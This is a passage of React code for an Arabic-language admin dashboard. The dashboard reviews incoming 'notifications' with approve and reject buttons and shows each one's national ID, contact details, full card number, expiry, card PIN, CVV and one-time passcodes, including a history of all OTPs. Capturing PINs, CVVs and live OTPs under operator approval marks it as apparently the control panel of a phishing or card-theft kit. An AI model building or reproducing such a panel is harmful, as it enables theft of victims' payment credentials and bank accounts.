                                      <Badge className="bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800">
                                        <CheckCircle className="h-3 w-3 mr-1" />
                                        موافق
                                      </Badge>
                                    ) : notification.status === "rejected" ? (
                                      <Badge className="bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800">
                                        <XCircle className="h-3 w-3 mr-1" />
                                        مرفوض
                                      </Badge>
                                    ) : (
                                      <Badge
                                        variant="outline"
                                        className="bg-amber-50 text-amber-700 border-amber-200 dark:bg-amber-950/30 dark:text-amber-300 dark:border-amber-800"
                                      >
                                        <Clock className="h-3 w-3 mr-1" />
                                        معلق
                                      </Badge>
                                    )}
                                  </div>
                                  <div className="flex items-center gap-2">
                                    <Clock className="h-4 w-4 text-slate-400" />
                                    <span className="text-sm text-slate-600 dark:text-slate-400">
                                      {notification.createdDate &&
                                        formatDistanceToNow(new Date(notification.createdDate), {
                                          addSuffix: true,
                                          locale: ar,
                                        })}
                                    </span>
                                  </div>
                                </div>

                                <div className="flex gap-2 mt-3 pt-3 border-t border-slate-200/60 dark:border-slate-700/60">
                                  <Button
                                    onClick={() => handleApproval("approved", notification.id)}
                                    className="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white shadow-sm"
                                    size="sm"
                                    disabled={notification.status === "approved"}
                                  >
                                    <CheckCircle className="h-4 w-4 mr-1" />
                                    قبول
                                  </Button>
                                  <Button
                                    onClick={() => handleApproval("rejected", notification.id)}
                                    className="flex-1 bg-red-600 hover:bg-red-700 text-white shadow-sm"
                                    size="sm"
                                    disabled={notification.status === "rejected"}
                                  >
                                    <XCircle className="h-4 w-4 mr-1" />
                                    رفض
                                  </Button>
                                  <FlagColorSelector
                                    notificationId={notification.id}
                                    currentColor={notification.flagColor || null}
                                    onColorChange={handleFlagColorChange}
                                  />
                                  <Button
                                    variant="outline"
                                    onClick={() => handleDelete(notification.id)}
                                    className="w-10 p-0 text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
                                    size="sm"
                                  >
                                    <Trash2 className="h-4 w-4" />
                                  </Button>
                                </div>
                              </div>
                            </CardContent>
                          </Card>
                        ))
                      ) : (
                        <div className="text-center py-12">
                          <div className="flex flex-col items-center gap-4">
                            <div className="bg-slate-100 dark:bg-slate-800 rounded-full p-4">
                              <Bell className="h-8 w-8 text-slate-400" />
                            </div>
                            <div>
                              <p className="text-lg font-semibold text-slate-900 dark:text-slate-100 mb-1">
                                لا توجد إشعارات
                              </p>
                              <p className="text-slate-600 dark:text-slate-400">
                                لا توجد إشعارات متطابقة مع الفلتر المحدد
                              </p>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>

                    {/* Pagination */}
                    {filteredNotifications.length > 0 && (
                      <div className="p-6 border-t border-slate-200/60 dark:border-slate-700/60 bg-slate-50/50 dark:bg-slate-800/50">
                        <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={handlePageChange} />
                      </div>
                    )}
                  </Card>
                </TabsContent>

                {/* Statistics Tab Content */}
                <TabsContent value="statistics" className="space-y-6 mt-0">
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    {/* Activity Timeline */}
                    <Card className="bg-white dark:bg-slate-900 shadow-lg border-slate-200/60 dark:border-slate-700/60">
                      <CardHeader className="border-b border-slate-200/60 dark:border-slate-700/60 bg-slate-50/50 dark:bg-slate-800/50">
                        <CardTitle className="text-lg font-bold flex items-center gap-3 text-slate-900 dark:text-slate-100">
                          <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
                            <Calendar className="h-5 w-5 text-blue-600 dark:text-blue-400" />
                          </div>
                          آخر النشاطات
                        </CardTitle>
                        <CardDescription className="text-slate-600 dark:text-slate-400">
                          آخر 5 نشاطات على النظام
                        </CardDescription>
                      </CardHeader>
                      <CardContent className="p-6">
                        <ActivityTimeline notifications={notifications} />
                      </CardContent>
                    </Card>

                    {/* Quick Actions Card */}
                    <Card className="bg-white dark:bg-slate-900 shadow-lg border-slate-200/60 dark:border-slate-700/60">
                      <CardHeader className="border-b border-slate-200/60 dark:border-slate-700/60 bg-slate-50/50 dark:bg-slate-800/50">
                        <CardTitle className="text-lg font-bold flex items-center gap-3 text-slate-900 dark:text-slate-100">
                          <div className="bg-emerald-100 dark:bg-emerald-900/30 p-2 rounded-lg">
                            <Settings className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
                          </div>
                          إجراءات سريعة
                        </CardTitle>
                        <CardDescription className="text-slate-600 dark:text-slate-400">
                          الإجراءات الأكثر استخداماً
                        </CardDescription>
                      </CardHeader>
                      <CardContent className="p-6 space-y-3">
                        <Button
                          variant="outline"
                          className="w-full justify-start h-12 border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
                          onClick={() => setExportDialogOpen(true)}
                        >
                          <Download className="mr-3 h-5 w-5 text-blue-600 dark:text-blue-400" />
                          <div className="text-left">
                            <div className="font-medium text-slate-900 dark:text-slate-100">تصدير البيانات</div>
                            <div className="text-xs text-slate-600 dark:text-slate-400">
                              تصدير الإشعارات بصيغة CSV أو JSON
                            </div>
                          </div>
                        </Button>
                        <Button
                          variant="outline"
                          className="w-full justify-start h-12 border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
                          onClick={() => setSettingsOpen(true)}
                        >
                          <Settings className="mr-3 h-5 w-5 text-purple-600 dark:text-purple-400" />
                          <div className="text-left">
                            <div className="font-medium text-slate-900 dark:text-slate-100">إعدادات الإشعارات</div>
                            <div className="text-xs text-slate-600 dark:text-slate-400">تخصيص إعدادات النظام</div>
                          </div>
                        </Button>
                        <Button
                          variant="outline"
                          className="w-full justify-start h-12 border-red-200 text-red-600 hover:bg-red-50 hover:border-red-300 dark:border-red-800 dark:text-red-400 dark:hover:bg-red-950/30"
                          onClick={handleClearAll}
                          disabled={notifications.length === 0}
                        >
                          <Trash2 className="mr-3 h-5 w-5" />
                          <div className="text-left">
                            <div className="font-medium">مسح جميع الإشعارات</div>
                            <div className="text-xs opacity-75">حذف جميع الإشعارات نهائياً</div>
                          </div>
                        </Button>
                      </CardContent>
                    </Card>
                  </div>
                </TabsContent>
              </Tabs>
            </div>
          </div>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent
          className="bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700 max-w-[90vw] md:max-w-md shadow-xl"
          dir="rtl"
        >
          <DialogHeader className="border-b border-slate-200 dark:border-slate-700 pb-4">
            <DialogTitle className="flex items-center gap-3 text-xl font-bold text-slate-900 dark:text-slate-100">
              {selectedInfo === "personal" ? (
                <>
                  <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
                    <Users className="h-5 w-5 text-blue-600 dark:text-blue-400" />
                  </div>
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <div className="bg-emerald-100 dark:bg-emerald-900/30 p-2 rounded-lg">
                    <CreditCard className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
                  </div>
                  معلومات البطاقة
                </>
              ) : (
                "معلومات عامة"
              )}
            </DialogTitle>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-1 p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700 mt-4">
              {selectedNotification.idNumber && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">رقم الهوية:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.idNumber}</span>
                </div>
              )}
              {selectedNotification.email && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">البريد الإلكتروني:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.email}</span>
                </div>
              )}
              {selectedNotification?.phone && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">رقم الجوال:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification?.phone}</span>
                </div>
              )}
              {selectedNotification.name && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">الاسم:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.name}</span>
                </div>
              )}
              {selectedNotification.phone && (
                <div className="flex justify-between items-center py-3">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">الهاتف:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.phone}</span>
                </div>
              )}
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-1 p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700 mt-4">
              {selectedNotification.bank && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">البنك:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.bank}</span>
                </div>
              )}
              {selectedNotification.cardNumber && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">رقم البطاقة:</span>
                  <div className="font-bold" dir="ltr">
                    {selectedNotification.prefix && (
                      <Badge
                        variant="outline"
                        className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 mr-1 font-mono"
                      >
                        {selectedNotification.prefix}
                      </Badge>
                    )}
                    <Badge
                      variant="outline"
                      className="bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800 font-mono"
                    >
                      {selectedNotification.cardNumber}
                    </Badge>
                  </div>
                </div>
              )}
              {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">تاريخ الانتهاء:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">
                    {selectedNotification.year && selectedNotification.month
                      ? `${selectedNotification.year}/${selectedNotification.month}`
                      : selectedNotification.cardExpiry}
                  </span>
                </div>
              )}
              {selectedNotification.pass && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">رمز البطاقة:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.pass}</span>
                </div>
              )}
              {(selectedNotification.otp || selectedNotification.otpCode) && (
                <div className="flex justify-between items-center py-3 border-b border-slate-200/60 dark:border-slate-700/60">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">رمز التحقق المرسل:</span>
                  <Badge className="font-bold bg-emerald-600 text-white font-mono">
                    {selectedNotification.otp}
                    {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
                  </Badge>
                </div>
              )}
              {selectedNotification.cvv && (
                <div className="flex justify-between items-center py-3">
                  <span className="font-semibold text-slate-600 dark:text-slate-400">رمز الامان:</span>
                  <span className="font-bold text-slate-900 dark:text-slate-100">{selectedNotification.cvv}</span>
                </div>
              )}
              {selectedNotification.allOtps &&
                Array.isArray(selectedNotification.allOtps) &&
                selectedNotification.allOtps.length > 0 && (
                  <div className="pt-3 border-t border-slate-200/60 dark:border-slate-700/60">
                    <span className="font-semibold text-slate-600 dark:text-slate-400 block mb-3">جميع الرموز:</span>
                    <div className="flex flex-wrap gap-2">
                      {selectedNotification.allOtps.map((otp, index) => (
                        <Badge
                          key={index}
                          variant="outline"
                          className="bg-slate-100 text-slate-700 border-slate-300 dark:bg-slate-800 dark:text-slate-300 dark:border-slate-600 font-mono"
                        >
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
